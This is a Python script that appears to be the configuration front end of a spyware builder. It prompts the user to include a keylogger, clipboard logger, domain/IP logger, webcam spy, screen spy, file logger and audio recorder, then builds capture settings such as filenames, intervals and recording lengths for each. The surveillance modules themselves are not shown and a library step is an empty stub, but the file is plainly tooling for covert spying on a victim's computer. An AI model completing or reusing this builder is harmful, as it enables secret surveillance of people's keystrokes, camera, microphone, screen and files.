#!/usr/bin/env python3
from colorama import Fore, Style, init
import sys

init(autoreset=True)


def option(prompt):
    allowed_true = ["yes", "y", "1"]
    allowed_false = ["no", "n", "0"]

    while True:
        user_input = input(f"{Fore.WHITE}{Style.BRIGHT}{prompt}").strip().lower()
        if user_input in allowed_true:
            return True
        elif user_input in allowed_false:
            return False
        else:
            print(f"{Fore.RED}{Style.BRIGHT}Invalid input. Please enter 'yes', 'no', 'y', 'n', '1', or '0'.")


print(f"{Fore.GREEN}{Style.BRIGHT}Generating SpyWare...")

include_KeyLogger = option("Include KeyLogger?: ")
include_ClipboardLogger = option("Include ClipboardLogger?: ")
include_DomainsLogger = option("Include Domains/IP Logger?: ")
include_WebcamSpy = option("Include Webcam Spy?: ")
include_ScreenSpy = option("Include Screen Spy?: ")
include_FilesLogger = option("Include File Logger?: ")
include_AudioRecorder = option("Include Audio Recorder?: ")


def set_configs():
    print(f"{Fore.GREEN}{Style.BRIGHT}Setting custom configurations... ")

    if include_KeyLogger:
        print(f"{Fore.CYAN}KeyLogger Configuration:")
        filename = input("Filename [default: keySpy.txt]: ") or "keySpy.txt"
        event_press = input("Log key press events? (0/1) [default: 0]: ") or "0"
        event_release = input("Log key release events? (0/1) [default: 0]: ") or "0"
        hot_keys = input("Log hotkeys? (0/1) [default: 1]: ") or "1"
        event_time = input("Log event timestamps? (0/1) [default: 1]: ") or "1"

        keylogger_conf = f"""[SAVE]
        filename = {filename}
        event_press = {event_press}
        event_release = {event_release}
        hot_keys = {hot_keys}
        event_time = {event_time}

        [TIME]
        """

    if include_ClipboardLogger:
        print(f"{Fore.CYAN}Clipboard Logger Configuration:")
        filename = input("Filename [default: clipboard.txt]: ") or "clipboard.txt"
        check_interval = input("Check interval (seconds) [default: 11]: ") or "11"

        clipboard_conf = f"""[SAVE]
        filename = {filename}

        [TIME]
        check_internval = {check_interval}
        """

    if include_DomainsLogger:
        print(f"{Fore.CYAN}Domains Logger Configuration:")
        filename = input("Filename [default: domains.txt]: ") or "domains.txt"
        interval_dns = input("DNS check interval [default: 60]: ") or "60"
        interval_appdata = input("AppData check interval [default: 86400]: ") or "86400"
        interval_reading_file = input("File reading interval [default: 0.5]: ") or "0.5"
        interval_domain = input("Domain check interval [default: 0.05]: ") or "0.05"

        domains_conf = f"""[SAVE]
        filename = {filename}

        [TIME]
        interval_dns = {interval_dns}
        interval_appdata = {interval_appdata}
        interval_reading_file = {interval_reading_file}
        interval_domain = {interval_domain}
        """

    if include_WebcamSpy:
        print(f"{Fore.CYAN}Webcam Spy Configuration:")
        filename = input("Filename pattern [default: webcam*.png]: ") or "webcam*.png"
        dirname = input("Save directory [default: pictures]: ") or "pictures"
        picture_interval = input("Picture interval (seconds) [default: 3600]: ") or "3600"

        webcam_conf = f"""[SAVE]
        filename = {filename}
        dirname = {dirname}

        [TIME]
        picture_interval = {picture_interval}
        """

    if include_ScreenSpy:
        print(f"{Fore.CYAN}Screen Spy Configuration:")
        filename = input("Filename pattern [default: screenshot*.png]: ") or "screenshot*.png"
        dirname = input("Save directory [default: screenshots]: ") or "screenshots"
        screenshot_interval = input("Screenshot interval (seconds) [default: 3600]: ") or "3600"

        screen_conf = f"""[SAVE]
        filename = {filename}
        dirname = {dirname}

        [TIME]
        screenshot_interval = {screenshot_interval}
        """

    if include_FilesLogger:
        print(f"{Fore.CYAN}Files Logger Configuration:")
        filename = input("Filename [default: files.csv]: ") or "files.csv"
        file_interval = input("File interval [default: 0.1]: ") or "0.1"
        directory_interval = input("Directory interval [default: 1]: ") or "1"
        scan_interval = input("Full scan interval (seconds) [default: 86400]: ") or "86400"

        files_conf = f"""[SAVE]
        filename = {filename}

        [TIME]
        file_interval = {file_interval}
        directory_interval = {directory_interval}
        scan_interval = {scan_interval}
        """

    if include_AudioRecorder:
        print(f"{Fore.CYAN}Audio Recorder Configuration:")
        filename = input("Filename pattern [default: record*.wav]: ") or "record*.wav"
        dirname = input("Save directory [default: records]: ") or "records"
        interval = input("Recording interval (seconds) [default: 3590]: ") or "3590"
        record_time = input("Each recording length (seconds) [default: 10]: ") or "10"

        audio_conf = f"""[SAVE]
        filename = {filename}
        dirname = {dirname}

        [TIME]
        interval = {interval}
        record_time = {record_time}
        """

def add_libraries():
    pass
